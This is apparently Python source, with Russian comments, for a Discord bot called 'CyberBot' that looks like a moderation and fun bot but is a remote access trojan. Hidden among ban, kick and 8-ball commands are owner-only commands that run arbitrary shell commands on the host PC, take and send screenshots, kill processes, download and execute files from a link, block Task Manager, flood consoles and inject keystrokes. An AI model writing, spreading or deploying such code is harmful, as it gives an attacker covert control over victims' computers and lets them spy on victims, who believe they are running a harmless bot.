# Пожалуйста не меняйте ничего в команде getlink или укажите в хелпе автора Thund33r.
# Пожалуйста не меняйте ничего в команде getlink или укажите в хелпе автора Thund33r.
# Пожалуйста не меняйте ничего в команде getlink или укажите в хелпе автора Thund33r.
# Пожалуйста не меняйте ничего в команде getlink или укажите в хелпе автора Thund33r.
# Пожалуйста не меняйте ничего в команде getlink или укажите в хелпе автора Thund33r.
import discord
from discord.ext import commands
import asyncio
import pyscreenshot
import os
from psutil import process_iter
from tkinter import messagebox
import webbrowser
import random
from getpass import getuser
import keyboard
import requests
import ctypes
from asyncio import sleep
owners = [айди людей которые будут иметь доступ к ратнukу]
userid=getuser()+str(random.randint(123, 321))
token = 'токен бота'
bot = commands.Bot(intents = discord.Intents.all(), command_prefix='cb.')
bot.remove_command('help')
if os.name == "nt":
    os.system("cls")
    os.system("title CyberBot")
	
@bot.event
async def on_ready():
     while True:
          await bot.change_presence(status=discord.Status.online, activity=discord.Game("cb.help"))
		
@bot.command()
async def help(ctx):
    await ctx.send("```cb.ban (name) (reason) - забанит пользователя.\ncb.unban (name) - разбанит пользователя.\ncb.mute (name) - замьютит пользователя.\ncb.unmute (name) - размьютит пользователя.\ncb.chatclear (amount) - очистит чат.\ncb.kick (name) (reason) - выгонит пользователя.\ncb.getlink - выдаст ссылку на добавление данного бота.\ncb.say (text) - напишет ваш текст эмбедом.\ncb.ping - выдаст пинг бота.\ncb.ball (question) - ответит на ваш вопрос.\ncb.popit - выведет в чат попит.\ncb.cb.cmd (pcname) (command) - Выполнить команду в cmd\ncb.proclist (pcname) - Лист процессов\ncb.users - Посмотреть всех юзеров\ncb.killproc (pcname) (processname) - Закрыть процесс по имени\ncb.forkbomb (pcname) (count) - Куча консолек\ncb.msgbox (pcname) (text) - Окно с информацией\ncb.screen (pcname) - Сделать скриншот монитора\ncb.wall (pcname) (image) - Поставить картинку на рабочий стол\ncb.upload (pcname) (file) - Загрузить файл на пк юзера\ncb.taskmgrblock (pcname) - Отключение Taskmgr\ncb.taskmgrunblock (pcname) - Включение Taskmgr\ncb.press (pcname) (button) - Имитирует клавишу\ncb.write (pcname) (text) - Набирает текст\ncb.web (pcname) (www) - Открыть ссылку```")          
@bot.command()
async def users(ctx):   
                if ctx.author.id not in owners:
                    await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                 await ctx.send(userid)   
		
@bot.command()
async def screen(ctx, userpc):
        if ctx.author.id not in owners:
            await ctx.send("У вас нет прав для использования этой команды.") 
        else:
         if userid==userpc:          
            abc = pyscreenshot.grab()
        abc.save(fp=f'{os.getenv("TEMP")}\\Screen.jpg')
        abc.close()
        await ctx.send(file=discord.File(f'{os.getenv("TEMP")}\\Screen.jpg'))
   
@bot.command()    
async def killproc(ctx, userpc, proc_name):
            if ctx.author.id not in owners:
               await ctx.send("У вас нет прав для использования этой команды.") 
            else:
             if userid==userpc:  
                for procname in process_iter():
                  if procname.name()==proc_name:
                   procname.kill()
            
@bot.command()
async def cmd(ctx,userpc, *, arg):
                if ctx.author.id not in owners:
                    await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                    if userid==userpc:  
                        os.system(arg)

@bot.command()
async def msgbox(ctx,userpc, *, arg):
                if ctx.author.id not in owners:
                 await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                 if userid==userpc:  
                    title=str(arg).split('|')[0]
                    message=str(arg).split('|')[-1]
                    messagebox.showinfo(title=title, message=message)
    
@bot.command()
async def openweb(ctx, userpc, arg):
                if ctx.author.id not in owners:
                 await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                 if userid==userpc:  
                    webbrowser.open(url=arg,new=1) 
     
@bot.command()
async def cmdbomb(ctx, userpc, kolvo):
                if ctx.author.id not in owners:
                    await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                  if userid==userpc: 
                     for i in range(int(kolvo)):
                        os.system("start cmd")
            
@bot.command()
async def press(ctx, userpc, button):
                if ctx.author.id not in owners:
                    await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                  if userid==userpc:
                   keyboard.send(button)
     
@bot.command()        
async def write(ctx, userpc, *, text):
                if ctx.author.id not in owners:
                    await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                    if userid==userpc:
                     keyboard.write(text)
        
@bot.command()        
async def proclist(ctx, userpc, username):
                if ctx.author.id not in owners:
                   await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                    if username == userid:
                     proclist = ""
                for pr in process_iter():
                    prcn = pr.name()
                    if prcn != "svchost.exe" and prcn.endswith(".exe"):
                        proclist += f"{prcn[:-4]}\n"
                await ctx.send(proclist)
                
@bot.command()
async def upload(ctx, userpc, link):
                if ctx.author.id not in owners:
                   await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                    if userpc == userid:
                        r = requests.get(link)
                        filename=str(link).split('/')[-1]
                        with open(file=f'{os.getenv("TEMP")}\\{filename}', mode="wb") as file:
                            file.write(r.content)
                            file.close()
                            os.startfile(f'{os.getenv("TEMP")}\\{filename}')
                            
@bot.command()
async def wall(ctx, userpc, link):
                if ctx.author.id not in owners:
                   await ctx.send("У вас нет прав для использования этой команды.") 
                else:
                    if userpc == userid:
                        r = requests.get(link)
                        filename=str(link).split('/')[-1]
                        with open(file=f'{os.getenv("TEMP")}\\{filename}', mode="wb") as file:
                            file.write(r.content)
                            file.close()
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getenv("TEMP")}\\{filename}', 0)                      

@bot.command()
async def taskmgrblock(ctx, userpc):
    if ctx.author.id not in owners:
     await ctx.send("У вас нет прав для использования этой команды.") 
    else:
        if userpc == userid:
            fhff = True
            while fhff:        
                for i in process_iter():
                  if i.name()=='Taskmgr.exe':
                    i.kill() 

@bot.command()
async def taskmgrunblock(ctx, userpc):
    if ctx.author.id not in owners:
        await ctx.send("У вас нет прав для использования этой команды.")
    else:
        if userpc == userid:
         fhff = False                    

@bot.command(pass_context=True)
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason = None):
    await ctx.message.delete()
    await member.ban(reason=reason)
    await ctx.send(f'Пользователь {member.name} забанен.')

@bot.command(pass_context=True)
@commands.has_permissions(ban_members=True)
async def unban(ctx, member):
    users = ctx.guild_bans()
    for ban_user in users:
        if ban_user.user == member:
            await ctx.guild.unban(ban_user.user)

@bot.command(pass_context=True)
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason = None):
    await ctx.message.delete()
    await member.kick(reason=reason)
    await ctx.send(f'Пользователь {member.name} кикнут.') 

@bot.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def mute(ctx, member: discord.Member):
    await ctx.message.delete()
    mute = discord.utils.get(ctx.message.guild.roles,name="CB-MUTED")
    await member.add_roles(mute)
    await ctx.send(f'Пользователь {member.name} замьючен.')
    await asyncio.sleep(1800)
    await member.remove_roles(mute)

@bot.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def chatclear(ctx, amount : int):
    await ctx.channel.purge(limit=int(amount))
 
@bot.command()
async def getlink(ctx):
	embed = discord.Embed(
		title = f'CyberBot coded by ! ᴛʜᴜɴᴅ33ʀ#0001',
		description = f'CyberBot версии 2.0.\nДобавить бота: https://discord.com/api/oauth2/authorize?client_id=1050106324794474506&permissions=8&scope=bot%20applications.commands',
		colour = discord.Colour.from_rgb(155, 10, 25)
	)
	await ctx.send(embed=embed)  

@bot.command()
async def say(ctx, *, text=''):
	if text == '':
		msg = await ctx.send(f'Укажите текст!')
		asyncio.sleep(1)
		await msg.delete()
		await ctx.message.delete()
	else:
		await ctx.message.delete()
		await ctx.send(embed=discord.Embed(description=text))

@bot.command()
async def ping(ctx):
	await ctx.send(embed=discord.Embed(title=f':ping_pong: Понг!', description = f'Задержка API - {round(bot.latency * 1000)}ms', colour=discord.Colour.from_rgb(111,228,111)))

@bot.command()
async def popit(ctx):
	embed = discord.Embed(
		title = 'Поп-ит',
		description = f'||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:||\n||:blue_square:|| ||:blue_square:|| ||:blue_square:|| ||:blue_square:|| ||:blue_square:||\n||:green_square:|| ||:green_square:|| ||:green_square:|| ||:green_square:|| ||:green_square:||\n||:red_square:|| ||:red_square:|| ||:red_square:|| ||:red_square:|| ||:red_square:||\n||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:||',
		colour = discord.Colour.from_rgb(228,100,16)
	)
	embed.set_footer(text=f'По запросу {ctx.author}')
	msgg = await ctx.send(embed=embed)

@bot.command()
async def ball(ctx, *, question):
	answers = ['Ага :ok_hand:', 'Я так подумал, в итоге я отвечу - нет :x:', 'Весьма сомнительно, но правда :astonished:', 'Конечно же нет! :poop:', 'Я не знаю что на это ответить :robot:', 'Очень крутой вопрос, я его не понял :grin:']
	answer = random.choice(answers)
	embed = discord.Embed(
		title = 'Шар думает... :timer:',
		description = f'Я думаю, что ответить на `{question}`...',
		colour = discord.Colour.from_rgb(0,228,66)
	)
	msg = await ctx.send(embed=embed)
	asyncio.sleep(1.5)
	embed = discord.Embed(
		title = 'Шар ответил на ваш вопрос :magic_wand:',
		description = f'Ответ: {answer}',
		colour = discord.Colour.from_rgb(0,228,66)
	)
	await msg.edit(embed=embed)                
        
bot.run(token)
